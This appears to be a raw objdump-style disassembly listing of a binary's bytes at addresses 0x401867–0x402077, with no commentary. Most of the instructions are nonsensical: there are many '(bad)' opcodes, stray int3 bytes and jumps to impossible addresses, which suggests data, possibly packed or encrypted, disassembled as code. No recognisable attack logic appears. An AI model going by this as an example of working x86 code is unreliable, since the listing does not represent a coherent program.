  401867:	add    BYTE PTR [ebp-0x7c5d8f01],bl
  40186d:	add    bh,bh
  40186f:	mov    esi,ebx
  401871:	mov    DWORD PTR [edx+0x2900e898],eax
  401877:	sbb    DWORD PTR [ecx-0x7cb18801],0xffffffff
  40187e:	(bad)  
  40187f:	jmp    DWORD PTR [edi]
  401881:	jmp    DWORD PTR [eax-0x64338621]
  401887:	(bad)  
  401888:	fmul   QWORD PTR [ecx+0x86c7]
  40188e:	add    BYTE PTR [ebx+0x71a4ff68],al
  401894:	js     0x401896
  401896:	inc    eax
  401897:	add    BYTE PTR [edi-0x1],dh
  40189a:	sbb    al,0xf6
  40189c:	inc    DWORD PTR [eax]
  40189e:	add    bh,bh
  4018a0:	add    DWORD PTR [eax],0x8a7419
  4018a6:	dec    esp
  4018a7:	add    BYTE PTR [ebx+0x0],ah
  4018aa:	adc    bh,BYTE PTR [edx]
  4018ac:	add    BYTE PTR [eax],al
  4018ae:	(bad)  
  4018af:	push   DWORD PTR [esi]
  4018b1:	mov    eax,eax
  4018b3:	xor    eax,0x128323
  4018b8:	dec    esi
  4018b9:	sbb    ebp,0xffffff95
  4018bc:	(bad)  
  4018bd:	dec    esp
  4018bf:	push   DWORD PTR [esi-0x3751d100]
  4018c5:	push   DWORD PTR [edi+edi*8-0x108200ee]
  4018cc:	int3   
  4018cd:	(bad)  
  4018ce:	dec    esp
  4018d0:	nop
  4018d1:	add    BYTE PTR [ecx],al
  4018d3:	or     eax,0xffefcce0
  4018d8:	add    bh,bh
  4018da:	pop    es
  4018db:	add    edi,edi
  4018dd:	dec    esp
  4018df:	jmp    edi
  4018e1:	jmp    FWORD PTR [ebp-0x100c36e]
  4018e7:	add    BYTE PTR [ecx-0x7c324201],cl
  4018ed:	cmp    edi,0xffffffff
  4018f0:	in     eax,0xff
  4018f2:	mov    bh,0xcb
  4018f4:	mov    esi,0xce009aff
  4018f9:	and    ebx,0xffffffbb
  4018fc:	add    BYTE PTR [eax],al
  4018fe:	(bad)  
  4018ff:	jmp    DWORD PTR [eax]
  401901:	inc    DWORD PTR [edi+0x5f]
  401904:	test   edi,edi
  401906:	(bad)  
  401908:	xchg   ecx,eax
  401909:	dec    DWORD PTR [eax+0x32]
  40190f:	push   esi
  401911:	int3   
  401912:	(bad)  
  401913:	jle    0x40190f
  401915:	add    BYTE PTR [edi+edi*8],bl
  401918:	dec    ebp
  401919:	(bad)  
  40191a:	jg     0x401919
  40191c:	inc    DWORD PTR [eax]
  40191e:	inc    DWORD PTR [eax]
  401920:	adc    bh,bh
  401922:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401923:	sub    al,0xf1
  401925:	int3   
  401926:	pop    ecx
  401927:	cmp    DWORD PTR [eax+eax*1+0xe3cb],0x0
  40192f:	(bad)  
  401930:	in     eax,dx
  401931:	int3   
  401932:	mov    ah,0xf5
  401934:	inc    esi
  401935:	inc    DWORD PTR [ecx+0x42ffff00]
  40193b:	js     0x40193d
  40193d:	inc    DWORD PTR [ebx+0x6ccc41ff]
  401943:	std    
  401944:	dec    edx
  401945:	inc    DWORD PTR [ebp-0x1]
  401948:	enter  0x1c00,0x94
  40194c:	cmp    edi,0xffffffff
  40194f:	dec    DWORD PTR [esi-0x1]
  401952:	(bad)  
  401953:	mov    dl,0xb4
  401955:	(bad)  
  401956:	(bad)  
  401958:	dec    ebx
  401959:	push   DWORD PTR [eax+0x71]
  40195c:	add    BYTE PTR [ebx-0xe27c01],al
  401962:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401963:	mov    al,ds:0x89ceff2c
  401968:	add    BYTE PTR cs:[edi+ebp*1],al
  40196c:	add    BYTE PTR [ebx-0x8ff01],al
  401972:	mov    al,0x2
  401974:	sbb    eax,0x9200e2ff
  401979:	add    BYTE PTR [edi-0x19],bl
  40197c:	inc    DWORD PTR [eax]
  40197e:	(bad)  
  40197f:	jmp    DWORD PTR [ecx-0x7d]
  401982:	pop    ss
  401983:	pop    eax
  401984:	mov    bh,bh
  401986:	mov    cl,0xff
  401988:	sti    
  401989:	xor    DWORD PTR [ebp-0x7c7cff58],0xffffffff
  401990:	or     DWORD PTR [ebx+0xcfdbd3],eax
  401996:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401997:	add    BYTE PTR ds:0xfffce000,cl
  40199d:	add    DWORD PTR [ebx-0x22ff2d01],0x28
  4019a4:	sub    edi,edi
  4019a6:	cdq    
  4019a7:	inc    ebp
  4019a9:	push   DWORD PTR [ecx-0x28]
  4019ac:	dec    esp
  4019ae:	add    BYTE PTR [eax],al
  4019b0:	adc    bh,bh
  4019b2:	das    
  4019b3:	pop    es
  4019b4:	inc    esp
  4019b5:	(bad)  
  4019b6:	inc    DWORD PTR [eax]
  4019b8:	add    DWORD PTR [ebx+0xff00],0xffffffff
  4019bf:	(bad)  
  4019c0:	std    
  4019c1:	sbb    BYTE PTR [eax],al
  4019c3:	(bad)  
  4019c4:	push   edx
  4019c6:	add    BYTE PTR [edi],bl
  4019c8:	(bad)  
  4019c9:	mov    edx,0xfffff5e3
  4019ce:	scas   al,BYTE PTR es:[edi]
  4019cf:	mov    DWORD PTR [eax+0x44],edi
  4019d2:	dec    esp
  4019d4:	and    DWORD PTR [ebx],0xffffffff
  4019d7:	dec    edi
  4019d8:	mov    DWORD PTR [edi],ebx
  4019da:	xor    DWORD PTR [eax+eax*1-0x33ff6f00],0x838383d5
  4019e5:	cdq    
  4019e6:	add    BYTE PTR [edx+0x3445b800],bl
  4019ec:	add    bh,bh
  4019ee:	retf   0x7a00
  4019f1:	jae    0x4019f2
  4019f3:	add    BYTE PTR [eax],al
  4019f5:	or     DWORD PTR [eax],eax
  4019f7:	inc    edi
  4019f8:	add    BYTE PTR [ecx],dl
  4019fa:	mov    ah,0x0
  4019fc:	mov    DWORD PTR [ebx+0x35fcff59],eax
  401a02:	inc    DWORD PTR [eax]
  401a04:	mov    DWORD PTR [esi],ebx
  401a06:	mov    DWORD PTR [ecx],edi
  401a08:	jmp    FWORD PTR [edi-0x941f]
  401a0e:	lahf   
  401a0f:	int3   
  401a10:	and    dh,BYTE PTR ds:0x71ccff89
  401a16:	int3   
  401a17:	pop    eax
  401a18:	jmp    DWORD PTR [eax+0xc]
  401a1b:	(bad)  
  401a1d:	(bad)  
  401a1e:	jge    0x401a1f
  401a20:	mov    dl,0x39
  401a22:	cmp    edi,0x0
  401a25:	pop    es
  401a26:	add    BYTE PTR [ebx],ch
  401a28:	jmp    FWORD PTR [esi+esi*8+0x5bffffff]
  401a2f:	call   DWORD PTR ds:0x8300ffda
  401a35:	mov    eax,DWORD PTR [eax]
  401a37:	mov    ch,0xff
  401a39:	adc    al,0xb4
  401a3b:	test   BYTE PTR [ebx+0x4bff7ccc],0xa6
  401a42:	add    ah,cl
  401a44:	push   esi
  401a46:	add    bh,dh
  401a48:	add    BYTE PTR [esi+0x6d],ah
  401a4b:	mov    eax,0xcc880089
  401a50:	xchg   ebp,eax
  401a51:	mov    al,0x83
  401a53:	add    BYTE PTR [ecx-0x5a0036],cl
  401a59:	jns    0x401aa7
  401a5b:	int3   
  401a5c:	add    ah,cl
  401a5e:	loopne 0x401a5f
  401a60:	test   DWORD PTR [ebp-0x1],ecx
  401a63:	int3   
  401a64:	call   FWORD PTR [ecx+ecx*4]
  401a67:	in     al,0xff
  401a69:	xor    al,bh
  401a6b:	aaa    
  401a6c:	inc    DWORD PTR [eax]
  401a6e:	sbb    al,0xff
  401a70:	jmp    0xd1a1b
  401a75:	mov    edi,edi
  401a77:	aas    
  401a78:	add    BYTE PTR [edx+0x43],ah
  401a7b:	sub    BYTE PTR [eax],al
  401a7d:	call   DWORD PTR [ecx-0xf68700]
  401a83:	(bad)  
  401a84:	call   DWORD PTR [ecx+0x5c894600]
  401a8a:	add    edx,DWORD PTR [ebx]
  401a8c:	add    bh,bh
  401a8e:	cmp    eax,0xffe025cc
  401a93:	mov    edi,edi
  401a95:	or     BYTE PTR [eax],al
  401a97:	mov    dh,0xff
  401a99:	ret    0x3b0a
  401a9c:	dec    esp
  401a9e:	xor    eax,0xff2de6ff
  401aa3:	add    BYTE PTR [eax],al
  401aa5:	sbb    eax,0x46ffa5ff
  401aaa:	repz out dx,al
  401aac:	(bad)  
  401aad:	push   DWORD PTR ds:0xd84bcc
  401ab3:	inc    DWORD PTR [ebx-0x7c41ffbb]
  401ab9:	xchg   esi,eax
  401aba:	cdq    
  401abb:	add    bh,bh
  401abd:	sub    DWORD PTR [esi+0x0],0xffffffa9
  401ac1:	repnz add DWORD PTR [ebx+0x70067ff],0xffffffff
  401ac9:	out    0x75,al
  401acb:	out    0x89,al
  401acd:	and    DWORD PTR [ebp-0x71ab7d],0xffffff83
  401ad4:	jmp    DWORD PTR [edx-0x7bffd07d]
  401ada:	xchg   edi,eax
  401adb:	cmp    bh,0xff
  401ade:	push   es
  401adf:	jmp    ebp
  401ae1:	dec    ebx
  401ae2:	add    BYTE PTR [eax],al
  401ae4:	int3   
  401ae5:	mov    eax,0x39ff7300
  401aea:	loope  0x401b42
  401aec:	(bad)  
  401aed:	(bad)  
  401aee:	jns    0x401aef
  401af0:	mov    dl,0x87
  401af2:	add    BYTE PTR [eax],al
  401af4:	(bad)  
  401af5:	jp     0x401a80
  401af7:	repnz inc DWORD PTR [ebx-0x7c76adb5]
  401afe:	push   0x895bec89
  401b03:	add    DWORD PTR [eax],0xffffffe0
  401b06:	mov    DWORD PTR [ebp-0x2d4bd01],ebx
  401b0c:	(bad)  
  401b0d:	(bad)  
  401b0e:	jns    0x401adc
  401b10:	(bad)  
  401b11:	inc    DWORD PTR ds:[eax]
  401b14:	add    BYTE PTR [esi-0x176b300],cl
  401b1a:	shl    DWORD PTR [eax+eax*1+0x70001acc],0xb6
  401b22:	add    BYTE PTR [eax],al
  401b24:	adc    DWORD PTR [ebp-0x657caf34],0xffffff8d
  401b2b:	cmp    bh,bh
  401b2d:	(bad)  
  401b2e:	jnp    0x401ab3
  401b30:	sbb    cl,BYTE PTR [eax+0x0]
  401b33:	add    BYTE PTR [eax],al
  401b35:	ins    BYTE PTR es:[edi],dx
  401b36:	add    BYTE PTR [edi],cl
  401b38:	add    dl,al
  401b3a:	dec    edi
  401b3b:	dec    ecx
  401b3c:	add    ah,cl
  401b3e:	xchg   DWORD PTR [eax],eax
  401b40:	xor    DWORD PTR [eax],ebp
  401b42:	inc    DWORD PTR [eax]
  401b44:	call   DWORD PTR [ebx-0x51005d01]
  401b4a:	arpl   WORD PTR [edi],bx
  401b4c:	add    bh,bh
  401b4e:	leave  
  401b4f:	inc    ecx
  401b51:	nop
  401b52:	int3   
  401b53:	int3   
  401b54:	call   DWORD PTR [ebp+0x0]
  401b57:	mov    ds:0x16cf8aff,eax
  401b5c:	int3   
  401b5d:	call   DWORD PTR ds:0x83160d89
  401b63:	add    BYTE PTR [eax],al
  401b65:	lahf   
  401b66:	call   DWORD PTR [edi+edi*8-0x68d6f5]
  401b6d:	dec    DWORD PTR [edi+edi*8]
  401b70:	in     eax,0x4f
  401b72:	inc    DWORD PTR [eax]
  401b74:	sbb    ebx,0x0
  401b77:	popf   
  401b78:	add    DWORD PTR [ecx-0x7f],0xfffffffe
  401b7c:	cmp    edi,0xffffff91
  401b7f:	(bad)  
  401b80:	mov    ebx,0xffffffdd
  401b85:	push   ss
  401b86:	add    BYTE PTR [ecx+0x244657cc],bh
  401b8c:	add    bh,bh
  401b8e:	call   0x8a2f8693
  401b93:	cmp    edi,0xffffff98
  401b96:	push   DWORD PTR [edi]
  401b98:	xor    ebp,0xffffffd1
  401b9b:	repz int3 
  401b9d:	add    BYTE PTR [edi-0x1],al
  401ba0:	jae    0x401bf9
  401ba2:	(bad)  
  401ba3:	inc    DWORD PTR [eax]
  401ba5:	ret    0xef83
  401ba8:	add    bl,dl
  401baa:	arpl   bx,sp
  401bac:	add    BYTE PTR [ebx-0x3bcaff60],al
  401bb2:	inc    DWORD PTR [eax]
  401bb4:	int3   
  401bb5:	scas   eax,DWORD PTR es:[edi]
  401bb6:	add    BYTE PTR [eax+0x0],ah
  401bb9:	pop    ss
  401bba:	mov    DWORD PTR [esi-0x430001],0xffffe3ae
  401bc4:	dec    DWORD PTR [ecx+ecx*4]
  401bc7:	sub    BYTE PTR [eax],al
  401bc9:	enter  0xd8a6,0x0
  401bcd:	jmp    DWORD PTR [eax-0x7d]
  401bd0:	mov    ah,BYTE PTR [esi]
  401bd2:	add    bh,bh
  401bd4:	cmp    DWORD PTR [ebp-0x7d],0x31
  401bd8:	cmp    DWORD PTR [edi-0x76ffdcd0],0x21
  401bdf:	call   FWORD PTR [edx-0x7c05]
  401be5:	out    dx,al
  401be6:	inc    DWORD PTR ds:0x353f0f00
  401bec:	add    bh,bh
  401bee:	xor    bh,bh
  401bf0:	fadd   QWORD PTR ds:[eax]
  401bf3:	inc    DWORD PTR [eax]
  401bf5:	dec    DWORD PTR ds:[edi-0x7d]
  401bf9:	(bad)  
  401bfa:	mov    ds:0xa8ffff6c,al
  401bff:	add    dl,dl
  401c01:	xchg   edx,eax
  401c02:	add    BYTE PTR [eax],al
  401c04:	add    BYTE PTR [edx-0x4ff9e34],dh
  401c0a:	push   ecx
  401c0b:	jge    0x401c0d
  401c0d:	dec    esp
  401c0f:	inc    DWORD PTR [eax]
  401c11:	cs add bh,bh
  401c14:	add    BYTE PTR [ecx+0x22ff9e00],cl
  401c1a:	xor    al,0xde
  401c1c:	inc    DWORD PTR [eax]
  401c1e:	and    bh,bh
  401c20:	and    ch,bl
  401c22:	add    BYTE PTR [ebx-0x6f008c01],al
  401c28:	or     eax,0x6b
  401c2b:	(bad)  
  401c2c:	add    BYTE PTR [ecx+0x77a7ff9d],cl
  401c32:	int3   
  401c33:	inc    DWORD PTR [ebx-0x7cb13343]
  401c39:	jo     0x401c41
  401c3b:	into   
  401c3c:	(bad)  
  401c3d:	push   DWORD PTR [edi-0x1]
  401c40:	jmp    0x13fa5aa
  401c45:	push   eax
  401c46:	add    BYTE PTR [eax-0x7d],bl
  401c49:	adc    DWORD PTR [ebx],esi
  401c4b:	popf   
  401c4c:	inc    DWORD PTR [eax]
  401c4e:	call   0xffff:0x591e83
  401c55:	mov    ecx,0xc2ccec83
  401c5a:	out    0xdb,al
  401c5c:	add    bh,bh
  401c5e:	jns    0x401c5f
  401c60:	pusha  
  401c61:	cmp    edi,edi
  401c63:	add    bh,bh
  401c65:	ret    
  401c66:	sub    DWORD PTR [eax+0x1a875889],0x0
  401c6d:	dec    DWORD PTR [ecx]
  401c6f:	add    DWORD PTR [eax-0x79],0xffffffff
  401c73:	int3   
  401c74:	or     DWORD PTR [esi],0xffffffff
  401c77:	mov    ds:0xd0b45100,eax
  401c7c:	inc    DWORD PTR [eax]
  401c7e:	pop    edi
  401c7f:	dec    DWORD PTR ds:0x83000003
  401c85:	jmp    0xfb7d:0x50ff1c83
  401c8c:	inc    DWORD PTR [ebx-0x61f800ca]
  401c92:	add    bh,bh
  401c94:	jmp    DWORD PTR [esi-0x1]
  401c97:	or     eax,0xeec345ff
  401c9c:	add    BYTE PTR [ecx+0x7ac089a3],cl
  401ca2:	dec    esp
  401ca4:	(bad)  
  401ca5:	jnp    0x401c30
  401ca7:	jecxz  0x401c2c
  401ca9:	out    dx,al
  401caa:	jnp    0x401c3f
  401cac:	add    bh,bh
  401cae:	das    
  401caf:	call   DWORD PTR [ebx+0x70]
  401cb2:	add    BYTE PTR [ecx+0x780009ff],cl
  401cb8:	add    BYTE PTR [edi+0xcc3c0c],cl
  401cbe:	sti    
  401cbf:	dec    DWORD PTR [edi]
  401cc1:	aas    
  401cc2:	inc    DWORD PTR [eax]
  401cc4:	add    BYTE PTR [esi],al
  401cc6:	jmp    DWORD PTR [eax-0x7d]
  401cc9:	mov    gs,WORD PTR [ecx+eiz*2]
  401ccc:	or     esp,0x6
  401ccf:	add    cl,bh
  401cd1:	nop
  401cd2:	add    DWORD PTR [eax],0x0
  401cd5:	jae    0x401cd6
  401cd7:	clc    
  401cd8:	or     DWORD PTR [ecx+eiz*1-0x46],0x0
  401cdd:	call   DWORD PTR [edx]
  401cdf:	add    ch,bh
  401ce1:	aas    
  401ce2:	(bad)  
  401ce3:	(bad)  
  401ce4:	jmp    FWORD PTR [eax+0x0]
  401ce7:	adc    al,BYTE PTR [eax]
  401ce9:	(bad)  
  401cea:	hlt    
  401ceb:	mov    esp,0xff54ff00
  401cf0:	or     ah,cl
  401cf2:	add    BYTE PTR [eax],al
  401cf4:	inc    esi
  401cf6:	add    BYTE PTR [edi],bl
  401cf8:	jmp    DWORD PTR [esi-0x33ff03d1]
  401cfe:	out    0xff,eax
  401d00:	iret   
  401d01:	xlat   BYTE PTR ds:[ebx]
  401d02:	(bad)  
  401d03:	(bad)  
  401d04:	inc    DWORD PTR [ebx]
  401d06:	mov    DWORD PTR [edx-0x1],ecx
  401d09:	fs dec esi
  401d0b:	(bad)  
  401d0c:	(bad)  
  401d0d:	jmp    FWORD PTR [ecx-0x7d]
  401d10:	sub    BYTE PTR [edx+0x59ffcc83],bh
  401d16:	add    BYTE PTR [ecx],bh
  401d18:	add    BYTE PTR ds:0x834e50,al
  401d1e:	pop    edi
  401d1f:	int3   
  401d20:	test   BYTE PTR [esi-0x1],bh
  401d23:	mov    edi,edi
  401d25:	mov    ah,0xff
  401d27:	jno    0x401cf5
  401d29:	xchg   edi,eax
  401d2a:	rcl    DWORD PTR [ebx-0x247601],1
  401d30:	or     edx,DWORD PTR [ebp-0x34]
  401d33:	(bad)  
  401d34:	call   FWORD PTR [ebp-0x63001c01]
  401d3a:	rep lods al,BYTE PTR ds:[esi]
  401d3c:	add    ah,cl
  401d3e:	mov    edx,0xff7585ff
  401d43:	add    BYTE PTR [ebx-0x7c3376b2],al
  401d49:	pop    es
  401d4a:	xchg   edx,eax
  401d4b:	outs   dx,BYTE PTR ds:[esi]
  401d4c:	add    BYTE PTR [eax],al
  401d4e:	daa    
  401d4f:	add    BYTE PTR [eax],dh
  401d51:	rol    DWORD PTR [eax],cl
  401d53:	or     esp,0xffffff80
  401d56:	add    BYTE PTR ds:0x7120e5ff,bh
  401d5c:	(bad)  
  401d5d:	push   esp
  401d5f:	(bad)  
  401d60:	mov    esi,0x83ff892b
  401d65:	adc    edi,edi
  401d67:	dec    esp
  401d68:	inc    DWORD PTR [ecx]
  401d6a:	jl     0x401de1
  401d6c:	int3   
  401d6d:	add    BYTE PTR [ecx+0xeffb00],ch
  401d73:	inc    DWORD PTR [eax]
  401d75:	xchg   edi,edi
  401d77:	mov    ds:0x45bb5aff,al
  401d7c:	inc    DWORD PTR [eax]
  401d7e:	(bad)  
  401d7f:	add    BYTE PTR [ebx-0x7c760023],al
  401d85:	lds    ecx,FWORD PTR [ecx-0x119b005e]
  401d8b:	sbb    al,0xff
  401d8d:	dec    DWORD PTR [ecx-0x1]
  401d90:	and    ebp,0x1eff0000
  401d96:	call   DWORD PTR [eax-0x1]
  401d99:	shl    BYTE PTR es:[ecx],0xcc
  401d9d:	int3   
  401d9e:	and    edi,edi
  401da0:	repnz push eax
  401da2:	add    bh,bh
  401da4:	(bad)  
  401da5:	jle    0x401da6
  401da7:	xor    edi,edi
  401da9:	lea    ecx,[esi-0x6b000058]
  401daf:	mov    DWORD PTR [esi-0x4a],edi
  401db5:	(bad)  
  401db6:	push   edi
  401db8:	mov    ecx,ecx
  401dba:	xchg   ebp,eax
  401dbb:	push   ss
  401dbc:	cmp    edi,0x28
  401dbf:	call   FWORD PTR [esi]
  401dc1:	sbb    eax,0xc0ff00ff
  401dc6:	jmp    edi
  401dc8:	push   DWORD PTR [esi+eax*8+0x5a]
  401dcc:	add    DWORD PTR [eax],0xffffffa8
  401dcf:	and    DWORD PTR [ecx-0xff767e],0xffffff9a
  401dd6:	dec    DWORD PTR [edi+0x710ff700]
  401ddc:	int3   
  401ddd:	or     edi,0xffffffff
  401de0:	xchg   ebp,eax
  401de1:	add    BYTE PTR gs:[eax],al
  401de4:	add    BYTE PTR [ebx-0x7d],bl
  401de7:	dec    DWORD PTR gs:[ecx]
  401dea:	in     eax,dx
  401deb:	(bad)  
  401dec:	mov    edi,edi
  401dee:	or     eax,0xfff8a400
  401df3:	mov    DWORD PTR [eax],eax
  401df5:	xor    edi,edi
  401df7:	pop    ds
  401df8:	add    BYTE PTR [esi+eax*8+0x2a],al
  401dfc:	inc    DWORD PTR [ebx-0x513000e1]
  401e02:	cmp    edi,0xffffff89
  401e05:	dec    esp
  401e06:	jmp    FWORD PTR [eax+eax*1]
  401e09:	addr16 mov dl,0xc3
  401e0c:	add    BYTE PTR [eax],al
  401e0e:	jb     0x401e10
  401e10:	sbb    ebx,DWORD PTR [ecx+0x5a00ffcc]
  401e16:	add    BYTE PTR [ebx-0x1],bl
  401e19:	ret    0x27a0
  401e1c:	add    BYTE PTR [eax],al
  401e1e:	and    BYTE PTR [eax],al
  401e20:	adc    dh,bl
  401e22:	add    BYTE PTR [eax],al
  401e24:	call   FWORD PTR [ebp-0x1]
  401e27:	fs sbb esi,0x8
  401e2b:	or     bh,bh
  401e2d:	(bad)  
  401e2e:	cmp    eax,DWORD PTR [eax]
  401e30:	cmp    DWORD PTR [ecx+0x0],0xffffffff
  401e34:	add    al,dh
  401e36:	int3   
  401e37:	call   0xcc0fac3b
  401e3c:	(bad)  
  401e3d:	(bad)  
  401e3e:	jge    0x401e40
  401e40:	mov    fs,WORD PTR [edx+0x158300ff]
  401e46:	(bad)  
  401e47:	mov    ebp,0xf6c37500
  401e4c:	add    DWORD PTR [eax],0xffffffbc
  401e4f:	jmp    edi
  401e51:	mov    ?,edi
  401e53:	inc    DWORD PTR [ebx-0xb4002b]
  401e59:	in     eax,0xce
  401e5b:	adc    al,0xff
  401e5d:	(bad)  
  401e5e:	call   0xfff46462
  401e63:	inc    DWORD PTR [eax]
  401e65:	xchg   ecx,eax
  401e66:	add    BYTE PTR [esi],dl
  401e68:	add    BYTE PTR [edi+0xff7a0d],bl
  401e6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e6f:	add    BYTE PTR [ecx+0x5d],ch
  401e72:	int3   
  401e73:	mov    DWORD PTR [eax],eax
  401e75:	lea    eax,[eax]
  401e77:	adc    bh,bh
  401e79:	pop    ebx
  401e7a:	pushf  
  401e7b:	dec    edi
  401e7c:	add    DWORD PTR [ebx+0x17f483f3],0x0
  401e83:	dec    DWORD PTR [ecx-0x7cad000d]
  401e89:	in     eax,0xab
  401e8b:	ins    BYTE PTR es:[edi],dx
  401e8c:	(bad)  
  401e8d:	jmp    FWORD PTR [ecx+0x73acc]
  401e93:	dec    DWORD PTR [ecx+0xe5ffaf]
  401e99:	fwait
  401e9a:	out    0x92,al
  401e9c:	inc    DWORD PTR [eax]
  401e9e:	aam    0x0
  401ea0:	mov    al,ds:0xccff893d
  401ea5:	add    bh,bh
  401ea7:	fild   WORD PTR [eax]
  401ea9:	cmp    eax,0xffff6661
  401eae:	pop    ds
  401eaf:	add    BYTE PTR [ebx+0x13],ch
  401eb2:	inc    DWORD PTR [ebx+0x5dcc9c83]
  401eb8:	int3   
  401eb9:	cwde   
  401eba:	push   eax
  401ebb:	mov    al,0xff
  401ebd:	add    BYTE PTR ds:0xffd335ff,ch
  401ec3:	dec    esp
  401ec5:	mov    esp,0xe88300ff
  401eca:	ret    0xffc1
  401ecd:	adc    DWORD PTR [ecx],0x0
  401ed0:	adc    DWORD PTR [esi+0x31cc8383],ebp
  401ed6:	add    BYTE PTR [eax-0x6078d201],ch
  401edc:	add    bh,bh
  401ede:	mov    edi,?
  401ee0:	retf   
  401ee1:	fwait
  401ee2:	(bad)  
  401ee3:	(bad)  
  401ee4:	call   FWORD PTR [ecx]
  401ee6:	call   DWORD PTR [edi+edi*8]
  401ee9:	sbb    eax,0xff1b10
  401eee:	sar    edi,0x3a
  401ef1:	retf   
  401ef2:	dec    DWORD PTR [ecx+0x50ffbcff]
  401ef8:	push   DWORD PTR [ebx+0x4a]
  401efb:	test   eax,0xff23ff00
  401f00:	push   0xffffff9c
  401f05:	inc    DWORD PTR [eax]
  401f07:	push   ebp
  401f08:	mov    DWORD PTR [eax],ebp
  401f0a:	jmp    0x401f75
  401f0c:	add    bh,bh
  401f0e:	out    0x0,al
  401f10:	push   ss
  401f11:	dec    esp
  401f12:	mov    edi,edi
  401f14:	int3   
  401f15:	mov    ch,0x0
  401f17:	cwde   
  401f18:	mov    edx,edi
  401f1a:	shl    ebp,cl
  401f1c:	inc    DWORD PTR [eax]
  401f1e:	enter  0xcaff,0x6d
  401f22:	add    BYTE PTR [eax],al
  401f24:	push   DWORD PTR ds:0xb5ff73ff
  401f2a:	lods   eax,DWORD PTR ds:[esi]
  401f2b:	dec    edi
  401f2c:	add    bh,bh
  401f2e:	mov    esi,0xffda1fff
  401f33:	(bad)  
  401f34:	push   DWORD PTR [edi+0x0]
  401f37:	pop    esp
  401f38:	add    BYTE PTR [esi+0xff0d5b],bl
  401f3e:	pop    ds
  401f3f:	add    dh,dh
  401f41:	sbb    DWORD PTR [eax],eax
  401f43:	int3   
  401f44:	add    BYTE PTR [ecx-0x1],ah
  401f47:	aad    0x89
  401f49:	pusha  
  401f4a:	retf   
  401f4b:	dec    ebp
  401f4c:	add    DWORD PTR [eax],0xffffff8b
  401f4f:	(bad)  
  401f50:	fimul  DWORD PTR [ebp-0x1]
  401f53:	mov    DWORD PTR [eax],eax
  401f55:	in     al,dx
  401f56:	call   FWORD PTR [ebp+0x32589cff]
  401f5c:	add    bh,bh
  401f5e:	test   eax,0x517489
  401f63:	(bad)  
  401f64:	(bad)  
  401f65:	cli    
  401f66:	add    BYTE PTR [esi-0x18dd527d],ah
  401f6c:	(bad)  
  401f6d:	dec    DWORD PTR [ebp-0x6d6900]
  401f73:	add    bh,bh
  401f75:	sbb    al,BYTE PTR [ebx-0x235e00b6]
  401f7b:	add    al,0x0
  401f7d:	jmp    DWORD PTR ds:0x83f0a300
  401f83:	inc    DWORD PTR [ebx-0x8400f7]
  401f89:	jge    0x401f8f
  401f8b:	pop    es
  401f8c:	add    BYTE PTR [eax],al
  401f8e:	in     eax,0xff
  401f90:	sub    ch,dh
  401f92:	add    BYTE PTR [eax],al
  401f94:	add    BYTE PTR [esi],bh
  401f96:	mov    ebp,ebx
  401f98:	jmp    DWORD PTR [eax+ebx*1+0x48ff83fe]
  401f9f:	inc    DWORD PTR [ecx-0x7c000093]
  401fa5:	ins    DWORD PTR es:[edi],dx
  401fa6:	call   ecx
  401fa8:	add    ch,ch
  401faa:	adc    al,BYTE PTR [edi]
  401fac:	int3   
  401fad:	add    BYTE PTR [ebx],bl
  401faf:	push   DWORD PTR [esi+ebx*4]
  401fb2:	add    BYTE PTR [eax],al
  401fb4:	inc    ebp
  401fb6:	(bad)  
  401fb7:	js     0x401fb8
  401fb9:	ds mov bh,0xfd
  401fbc:	add    bh,bh
  401fbe:	hlt    
  401fbf:	push   DWORD PTR [ecx]
  401fc1:	inc    DWORD PTR fs:[eax]
  401fc4:	sub    DWORD PTR [edi-0x933cc7d],0x5d
  401fcb:	cli    
  401fcc:	or     esp,0x71
  401fcf:	(bad)  
  401fd0:	fsubr  QWORD PTR [eax+0x0]
  401fd3:	int3   
  401fd4:	call   DWORD PTR [esi-0x1]
  401fd7:	(bad)  
  401fd9:	add    DWORD PTR [eax+0xd],esp
  401fdc:	(bad)  
  401fdd:	inc    DWORD PTR [edx-0x1]
  401fe0:	(bad)  
  401fe1:	fiadd  DWORD PTR [eax]
  401fe3:	int3   
  401fe4:	int3   
  401fe5:	and    al,0xff
  401fe7:	test   edi,edi
  401fe9:	call   0x10ccc5f
  401fee:	int3   
  401fef:	call   FWORD PTR [ecx]
  401ff1:	sar    edi,1
  401ff3:	inc    DWORD PTR [eax]
  401ff5:	popa   
  401ff6:	jmp    DWORD PTR [edx-0x26c43c00]
  401ffc:	inc    DWORD PTR [eax]
  401ffe:	or     cl,BYTE PTR [ecx-0xff60d4]
  402004:	call   esp
  402006:	int3   
  402007:	fdivp  st(7),st
  402009:	jae    0x40205a
  40200b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40200c:	(bad)  
  40200d:	jmp    DWORD PTR [edi+edi*8]
  402010:	dec    edx
  402011:	cmp    al,0xcc
  402013:	add    DWORD PTR [eax],0x5f
  402016:	call   DWORD PTR [edi]
  402018:	add    dl,bh
  40201a:	and    DWORD PTR [ebx],ebx
  40201c:	(bad)  
  40201d:	push   DWORD PTR [eax]
  40201f:	add    BYTE PTR [eax],al
  402021:	aaa    
  402022:	inc    DWORD PTR [ebx-0x500e27d]
  402028:	mov    DWORD PTR [eax],ebx
  40202a:	push   0x89ffff89
  40202f:	mov    DWORD PTR [ebx-0xffea],ecx
  402035:	mov    dl,0xff
  402037:	mov    eax,ds:0x4caf1b00
  40203c:	dec    esp
  40203e:	imul   ecx,DWORD PTR [ecx-0x33007b9d],0x2d00c0ff
  402048:	int3   
  402049:	sbb    bl,BYTE PTR [edi+0x6d]
  40204c:	add    BYTE PTR [eax],al
  40204e:	repnz add bh,bl
  402051:	dec    ebp
  402052:	inc    DWORD PTR [ebx+0x4300b383]
  402058:	(bad)  
  402059:	cmp    al,0x11
  40205b:	push   ebx
  40205c:	(bad)  
  40205d:	inc    DWORD PTR [ecx]
  40205f:	jmp    DWORD PTR [esi+0x52]
  402062:	add    BYTE PTR [eax],al
  402064:	jmp    FWORD PTR [ecx-0x6e767700]
  40206a:	inc    edx
  40206b:	aam    0xff
  40206d:	(bad)  
  40206e:	aas    
  40206f:	inc    DWORD PTR [ecx]
  402071:	out    0xff,eax
  402073:	add    BYTE PTR [eax],al
  402075:	push   0xffffffff
  402077:	jg     0x401ffc
